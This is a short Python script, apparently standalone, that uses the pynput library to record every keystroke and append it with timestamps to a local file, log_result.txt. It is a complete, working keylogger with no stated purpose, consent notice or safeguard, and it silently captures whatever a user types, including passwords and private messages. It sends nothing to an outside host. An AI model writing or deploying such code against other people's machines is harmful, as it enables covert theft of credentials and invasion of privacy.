from pynput.keyboard import Key,Listener
import logging

log_dir=""
logging.basicConfig(filename=(log_dir+"log_result.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s')
def on_press(key):
	global frase
	if 'Key' in str(key):
		logging.info(str(frase))
		frase = ''
		logging.info(str(key))
	else:
		try :
			frase += str(key)
		except:
			frase = str(key)

with Listener(on_press=on_press ) as listener:
	listener.join ()